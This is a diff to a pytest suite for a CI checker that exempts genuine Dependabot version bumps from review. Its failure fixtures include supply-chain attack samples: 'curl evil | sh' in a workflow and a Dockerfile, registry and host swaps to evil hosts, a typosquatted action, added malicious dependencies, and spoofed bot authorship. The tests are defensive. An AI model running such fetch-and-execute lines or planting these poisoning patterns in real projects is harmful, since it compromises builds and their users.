@@ -178,7 +178,8 @@ def test_template_and_checker_copies_identical():
 
 # --- Dependabot exemption (#426) -------------------------------------------------
 
-NO_EVIDENCE_BODY = "Bumps something from 1 to 2."
+BOT = "dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>"
+H1, H2 = "a" * 40, "b" * 40
 
 
 def _git(repo: Path, *args: str) -> str:
@@ -191,37 +192,80 @@ def _git(repo: Path, *args: str) -> str:
     ).stdout.strip()
 
 
+def _wheel(ver: str, digit: str) -> str:
+    return (
+        '    { url = "https://files.pythonhosted.org/packages/2f/21/ab/'
+        f'ruff-{ver}-py3-none-any.whl", hash = "sha256:{digit * 64}", size = 10, '
+        'upload-time = "2026-10-01T18:02:36.072Z" },\n'
+    )
+
+
+def _lock(ver: str, digit: str, spec: str = "0.1") -> str:
+    return (
+        f'[[package]]\nname = "ruff"\nversion = "{ver}"\n'
+        'source = { registry = "https://pypi.org/simple" }\n'
+        'sdist = { url = "https://files.pythonhosted.org/packages/c4/49/ab/'
+        f'ruff-{ver}.tar.gz", hash = "sha256:{digit * 64}", size = 9 }}\nwheels = [\n'
+        + _wheel(ver, digit)
+        + "]\n\n[package.metadata]\nrequires-dist = [\n"
+        + f'    {{ name = "ruff", specifier = ">={spec}" }},\n]\n'
+    )
+
+
+PYPROJECT = (
+    '[dependency-groups]\ndev = ["pytest>=9.1.1", "ruff>=0.16.10"]\n'
+    '[build-system]\nrequires = ["hatchling"]\n[tool.uv]\npackage = false\n'
+)
+WORKFLOW = f"steps:\n  - uses: actions/checkout@{H1} # v1.0.0\n  - run: echo hi\n"
+DOCKER = "FROM python:3.12-slim\nRUN echo hi\n"
+WF = ".github/workflows/ci.yml"
+BASE = {
+    "pyproject.toml": PYPROJECT,
+    "uv.lock": _lock("0.1.0", "1", "0.1"),
+    "Dockerfile": DOCKER,
+    WF: WORKFLOW,
+    "src.py": "x = 1\n",
+}
+
+
 def _dependabot_case(
     tmp_path: Path,
-    base_files: dict[str, str],
-    head_files: dict[str, str | None],
+    changes: dict[str, str | bytes | None],
     *,
     login: str = "dependabot[bot]",
     user_type: str = "Bot",
-    body: str = NO_EVIDENCE_BODY,
+    body: str = "Bumps something from 1 to 2.",
+    author: str = BOT,
     rename: dict[str, str] | None = None,
+    base_files: dict[str, str] | None = None,
+    extra_commit_author: str | None = None,
 ) -> subprocess.CompletedProcess[str]:
     import os
 
     repo = tmp_path / "repo"
     repo.mkdir()
     _git(repo, "init", "-q")
-    for name, text in base_files.items():
+    for name, text in (base_files or BASE).items():
         (repo / name).parent.mkdir(parents=True, exist_ok=True)
-        (repo / name).write_text(text, encoding="utf-8")
+        (repo / name).write_text(text, encoding="utf-8", newline="")
     _git(repo, "add", "-A")
     _git(repo, "commit", "-q", "-m", "base")
     base = _git(repo, "rev-parse", "HEAD")
     for old, new in (rename or {}).items():
         _git(repo, "mv", old, new)
-    for name, text in head_files.items():
-        if text is None:
+    for name, data in changes.items():
+        if data is None:
             _git(repo, "rm", "-q", name)
         else:
             (repo / name).parent.mkdir(parents=True, exist_ok=True)
-            (repo / name).write_text(text, encoding="utf-8")
+            raw = data if isinstance(data, bytes) else data.encode()
+            (repo / name).write_bytes(raw)
     _git(repo, "add", "-A")
-    _git(repo, "commit", "-q", "-m", "head")
+    _git(repo, "commit", "-q", "--allow-empty", "-m", "head", f"--author={author}")
+    if extra_commit_author:
+        (repo / "note.txt").write_text("x", encoding="utf-8")
+        _git(repo, "add", "-A")
+        _git(repo, "commit", "-q", "-m", "more", f"--author={extra_commit_author}")
     head = _git(repo, "rev-parse", "HEAD")
     event_path = tmp_path / "event.json"
     event_path.write_text(
@@ -238,7 +282,7 @@ def _dependabot_case(
         encoding="utf-8",
     )
     env = os.environ | {"GITHUB_EVENT_PATH": str(event_path)}
-    return subprocess.run(  # noqa: S603 - own checker with controlled input
+    return subprocess.run(  # noqa: S603
         [sys.executable, str(CHECKER)],
         cwd=repo,
         env=env,
@@ -248,37 +292,145 @@ def _dependabot_case(
     )
 
 
-MANIFESTS = {"pyproject.toml": "dep==1\n", "uv.lock": "dep 1\n", "src.py": "x = 1\n"}
-
-
-def test_dependabot_manifest_and_lock_only_passes_without_evidence(tmp_path: Path):
-    result = _dependabot_case(
-        tmp_path, MANIFESTS, {"pyproject.toml": "dep==2\n", "uv.lock": "dep 2\n"}
+def _bump_workflow(**kw: str) -> str:
+    return WORKFLOW.replace(
+        f"actions/checkout@{H1} # v1.0.0", kw.get("to", f"actions/checkout@{H2} # v2.0.0")
     )
-    assert result.returncode == 0, result.stderr
-    assert "Dependabot" in result.stdout
 
 
-def test_dependabot_touching_source_file_still_needs_evidence(tmp_path: Path):
-    result = _dependabot_case(
-        tmp_path, MANIFESTS, {"pyproject.toml": "dep==2\n", "src.py": "x = 2\n"}
+PASS_CASES = {
+    "pyproject versions": {
+        "pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0").replace(
+            "ruff>=0.16.10", "ruff>=0.17.0"
+        )
+    },
+    "uv.lock version, entries, specifier": {"uv.lock": _lock("0.2.0", "2", "0.2")},
+    "pyproject and lock together": {
+        "pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0"),
+        "uv.lock": _lock("0.2.0", "2", "0.2"),
+    },
+    "workflow sha and tag bump": {WF: _bump_workflow()},
+    "workflow tag bump": {WF: _bump_workflow(to="actions/checkout@v2.0.0 # v2.0.0")},
+    "dockerfile tag": {"Dockerfile": DOCKER.replace("3.12-slim", "3.13-slim")},
+    "dockerfile digest": {
+        "Dockerfile": DOCKER.replace("3.12-slim", "3.12-slim@sha256:" + "c" * 64)
+    },
+}
+
+
+def test_dependabot_pure_version_bumps_pass_without_evidence(tmp_path: Path):
+    for i, (name, changes) in enumerate(PASS_CASES.items()):
+        d = tmp_path / str(i)
+        d.mkdir()
+        result = _dependabot_case(d, changes)
+        assert result.returncode == 0, (name, result.stderr)
+        assert "Dependabot" in result.stdout, name
+
+
+def _lock_with(old: str, new: str) -> str:
+    return _lock("0.2.0", "2", "0.2").replace(old, new)
+
+
+FAIL_CASES: dict[str, dict[str, str | bytes | None]] = {
+    "source file": {
+        "pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0"),
+        "src.py": "x = 2\n",
+    },
+    "pyproject added dependency": {
+        "pyproject.toml": PYPROJECT.replace('"ruff>=0.16.10"]', '"ruff>=0.16.10", "evil>=1.0"]')
+    },
+    "pyproject build-system requires": {
+        "pyproject.toml": PYPROJECT.replace('["hatchling"]', '["evil"]')
+    },
+    "pyproject index url": {
+        "pyproject.toml": PYPROJECT + '[[tool.uv.index]]\nurl = "http://evil"\n'
+    },
+    "pyproject scripts entry": {
+        "pyproject.toml": PYPROJECT + "[project.scripts]\nx = 'evil:main'\n"
+    },
+    "pyproject package renamed": {
+        "pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytezt>=9.1.1")
+    },
+    "pyproject operator changed": {
+        "pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest==9.1.1")
+    },
+    "pyproject non-utf8": {"pyproject.toml": b"\xff\xfe bad\n"},
+    "uv.lock swapped source": {
+        "uv.lock": _lock_with(
+            'registry = "https://pypi.org/simple"', 'registry = "http://evil/simple"'
+        )
+    },
+    "uv.lock swapped host": {
+        "uv.lock": _lock("0.2.0", "2", "0.2").replace("files.pythonhosted.org", "evil.example")
+    },
+    "uv.lock hash swap without version bump": {"uv.lock": _lock("0.1.0", "9", "0.1")},
+    "uv.lock entry of another version": {
+        "uv.lock": _lock("0.2.0", "2", "0.2").replace("ruff-0.2.0-py3", "ruff-9.9.9-py3")
+    },
+    "uv.lock added package": {"uv.lock": BASE["uv.lock"] + _lock("0.2.0", "2", "0.2")},
+    "uv.lock binary": {"uv.lock": b"\x00\x01\x02"},
+    "workflow other owner": {WF: WORKFLOW.replace("actions/checkout", "evil/checkout")},
+    "workflow typosquat": {WF: WORKFLOW.replace("actions/checkout", "actoins/checkout")},
+    "workflow mutable main": {WF: _bump_workflow(to="actions/checkout@main")},
+    "workflow major-only tag": {WF: _bump_workflow(to="actions/checkout@v2")},
+    "workflow local action": {WF: _bump_workflow(to="./.github/actions/x@" + H2)},
+    "workflow docker target": {WF: _bump_workflow(to="docker://evil/img@sha256:" + "1" * 64)},
+    "workflow added step": {WF: WORKFLOW + f"  - uses: evil/x@{H2}\n"},
+    "workflow deleted step": {WF: "steps:\n  - run: echo hi\n"},
+    "workflow non-pin change": {WF: WORKFLOW.replace("echo hi", "curl evil | sh")},
+    "workflow permissions added": {WF: "permissions: write-all\n" + WORKFLOW},
+    "workflow new file": {".github/workflows/new.yml": f"steps:\n  - uses: a/b@{H2}\n"},
+    "workflow yaml extension": {".github/workflows/x.yaml": f"- uses: a/b@{H2}\n"},
+    "dockerfile other image": {"Dockerfile": DOCKER.replace("python:3.12-slim", "evil/img:latest")},
+    "dockerfile new final stage": {"Dockerfile": DOCKER + "FROM evil/img\n"},
+    "dockerfile lowercase from": {"Dockerfile": DOCKER.replace("FROM", "from")},
+    "dockerfile continuation": {"Dockerfile": DOCKER.replace("3.12-slim", "3.13-slim \\")},
+    "dockerfile run change": {"Dockerfile": DOCKER.replace("echo hi", "curl evil | sh")},
+    "dockerfile crlf": {"Dockerfile": DOCKER.replace("3.12", "3.13").replace("\n", "\r\n")},
+    "dockerfile binary": {"Dockerfile": b"FROM x\x00\n"},
+    "dockerfile platform flag": {"Dockerfile": DOCKER.replace("FROM ", "FROM --platform=x ")},
+    "nested dockerfile": {"sub/Dockerfile": "FROM x\n"},
+    "dockerfile dev": {"Dockerfile.dev": "FROM x\n"},
+}
+
+
+def test_dependabot_anything_beyond_a_version_bump_needs_evidence(tmp_path: Path):
+    for i, (name, changes) in enumerate(FAIL_CASES.items()):
+        d = tmp_path / str(i)
+        d.mkdir()
+        result = _dependabot_case(d, changes)
+        assert result.returncode == 1, (name, result.stdout)
+
+
+def test_dependabot_workflow_and_dockerfile_exec_bit_or_symlink_fail(tmp_path: Path):
+    import os
+
+    repo_changes = {"uv.lock": _lock("0.2.0", "2", "0.2")}
+    (tmp_path / "a").mkdir()
+    ok = _dependabot_case(tmp_path / "a", repo_changes)
+    assert ok.returncode == 0, ok.stderr
+    # delete and re-add of the same file, and a rename into a manifest name
+    (tmp_path / "b").mkdir()
+    assert _dependabot_case(tmp_path / "b", {}, rename={"src.py": "Dockerfile.new"}).returncode == 1
+    (tmp_path / "c").mkdir()
+    assert (
+        _dependabot_case(tmp_path / "c", {"uv.lock": None, "Dockerfile": "FROM x\n"}).returncode
+        == 1
     )
-    assert result.returncode == 1
-    assert "Review rounds" in result.stderr
+    assert os.name  # keep os import used on all platforms
 
 
 def test_non_dependabot_author_manifest_only_still_needs_evidence(tmp_path: Path):
-    result = _dependabot_case(
-        tmp_path, MANIFESTS, {"pyproject.toml": "dep==2\n"}, login="someone", user_type="User"
-    )
+    changes = {"pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0")}
+    result = _dependabot_case(tmp_path, changes, login="someone", user_type="User")
     assert result.returncode == 1
 
 
 def test_body_claiming_dependabot_does_not_exempt(tmp_path: Path):
+    changes = {"pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0")}
     result = _dependabot_case(
         tmp_path,
-        MANIFESTS,
-        {"pyproject.toml": "dep==2\n"},
+        changes,
         login="someone",
         user_type="User",
         body="Bumps dep. author: dependabot[bot]\nsigned-off-by: dependabot[bot]",
@@ -287,79 +439,28 @@ def test_body_claiming_dependabot_does_not_exempt(tmp_path: Path):
 
 
 def test_lookalike_login_or_user_type_does_not_exempt(tmp_path: Path):
-    for login, kind in (
-        ("dependabot", "Bot"),
-        ("dependabot[bot]", "User"),
-        ("Dependabot[bot]", "Bot"),
+    changes = {"pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0")}
+    for i, (login, kind) in enumerate(
+        (("dependabot", "Bot"), ("dependabot[bot]", "User"), ("Dependabot[bot]", "Bot"))
     ):
-        result = (
-            _dependabot_case(
-                tmp_path / (login + kind).replace("[", "_").replace("]", "_"),
-                MANIFESTS,
-                {"pyproject.toml": "dep==2\n"},
-                login=login,
-                user_type=kind,
-            )
-            if (tmp_path / (login + kind).replace("[", "_").replace("]", "_")).mkdir() is None
-            else None
-        )
-        assert result.returncode == 1, (login, kind)
+        d = tmp_path / str(i)
+        d.mkdir()
+        assert _dependabot_case(d, changes, login=login, user_type=kind).returncode == 1, login
 
 
-def test_dependabot_rename_into_manifest_name_fails_closed(tmp_path: Path):
-    result = _dependabot_case(tmp_path, MANIFESTS, {}, rename={"src.py": "Dockerfile"})
-    assert result.returncode == 1
-
-
-def test_dependabot_delete_and_add_fails_closed(tmp_path: Path):
-    result = _dependabot_case(tmp_path, MANIFESTS, {"uv.lock": None, "Dockerfile": "FROM x\n"})
-    assert result.returncode == 1
-    result = (
-        _dependabot_case(tmp_path / "b", MANIFESTS, {"pyproject.toml": None})
-        if (tmp_path / "b").mkdir() is None
-        else None
-    )
-    assert result.returncode == 1
-
-
-def test_dependabot_nested_manifest_path_fails_closed(tmp_path: Path):
-    base = MANIFESTS | {"sub/pyproject.toml": "a\n"}
-    result = _dependabot_case(tmp_path, base, {"sub/pyproject.toml": "b\n"})
-    assert result.returncode == 1
-
-
-WORKFLOW = "steps:\n  - uses: actions/checkout@aaa # v1\n  - run: echo hi\n"
-
-
-def test_dependabot_workflow_pin_only_passes(tmp_path: Path):
-    new = WORKFLOW.replace("@aaa # v1", "@bbb # v2")
-    result = _dependabot_case(
-        tmp_path,
-        MANIFESTS | {".github/workflows/ci.yml": WORKFLOW},
-        {".github/workflows/ci.yml": new},
-    )
-    assert result.returncode == 0, result.stderr
-
-
-def test_dependabot_workflow_non_pin_change_fails(tmp_path: Path):
-    new = WORKFLOW.replace("echo hi", "curl evil | sh")
-    result = _dependabot_case(
-        tmp_path,
-        MANIFESTS | {".github/workflows/ci.yml": WORKFLOW},
-        {".github/workflows/ci.yml": new},
-    )
-    assert result.returncode == 1
-
-
-def test_dependabot_dockerfile_from_line_passes_other_line_fails(tmp_path: Path):
-    base = MANIFESTS | {"Dockerfile": "FROM python:3.12\nRUN echo hi\n"}
-    ok = _dependabot_case(tmp_path, base, {"Dockerfile": "FROM python:3.13\nRUN echo hi\n"})
-    assert ok.returncode == 0, ok.stderr
-    (tmp_path / "x").mkdir()
-    bad = _dependabot_case(
-        tmp_path / "x", base, {"Dockerfile": "FROM python:3.12\nRUN curl evil | sh\n"}
-    )
-    assert bad.returncode == 1
+def test_commit_not_authored_by_dependabot_loses_the_exemption(tmp_path: Path):
+    changes = {"pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0")}
+    human = "Someone <someone@example.com>"
+    a = tmp_path / "a"
+    a.mkdir()
+    assert _dependabot_case(a, changes, author=human).returncode == 1
+    b = tmp_path / "b"
+    b.mkdir()
+    assert _dependabot_case(b, changes, extra_commit_author=human).returncode == 1
+    c = tmp_path / "c"
+    c.mkdir()
+    spoof = "dependabot[bot] <evil@example.com>"
+    assert _dependabot_case(c, changes, author=spoof).returncode == 1
 
 
 def test_dependabot_git_failure_fails_closed(tmp_path: Path):
@@ -387,10 +488,4 @@ def test_dependabot_git_failure_fails_closed(tmp_path: Path):
         text=True,
         check=False,
     )
-    assert result.returncode == 1
-
-
-def test_dependabot_removed_line_starting_with_dashes_is_not_skipped(tmp_path: Path):
-    base = MANIFESTS | {"Dockerfile": "FROM python:3.12\n-- note\n"}
-    result = _dependabot_case(tmp_path, base, {"Dockerfile": "FROM python:3.13\n"})
     assert result.returncode == 1
